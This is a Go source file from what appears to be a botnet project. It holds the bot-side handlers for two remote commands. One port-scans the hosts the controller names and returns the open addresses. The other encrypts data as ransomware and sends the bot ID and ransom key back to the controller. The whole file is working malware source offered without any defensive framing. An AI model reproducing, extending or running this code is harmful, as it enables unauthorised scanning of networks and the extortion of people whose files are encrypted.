package tcp

import (
	"bytes"
	"encoding/gob"
	"log"

	"github.com/threeaccents/botnet"
)

//HandleScan is
func (b *BotService) HandleScan(payload []byte) {
	req := new(scanRequest)
	if err := gob.NewDecoder(bytes.NewReader(payload)).Decode(req); err != nil {
		log.Println("handling scan", err)
		return
	}

	var resCh <-chan string
	switch req.Type {
	case "scan":
		resCh = b.PortScanner.Scan(req.Hosts, req.Ports)
	case "simple":
		resCh = b.PortScanner.SimpleScan(req.Hosts)
	case "full":
		resCh = b.PortScanner.FullScan(req.Hosts)
	}

	var res []string
	for addr := range resCh {
		res = append(res, addr)
	}

	if err := b.ScanResponseCmd(res); err != nil {
		log.Println("responding to scan", err)
		return
	}
}

//HandleRansome is
func (b *BotService) HandleRansome(payload []byte) {
	if err := b.CryptoService.Encrypt(""); err != nil {
		log.Panic(err)
	}
	msg := &ransomCompleteRequest{
		BotID: b.Bot.ID,
		Key:   b.Ransomer.Key(),
	}
	by, err := botnet.Bytes(msg)
	if err != nil {
		log.Panic(err)
	}
	data := append(commandToBytes("rancom"), by...)
	b.RansomCompleteCmd(data)
}
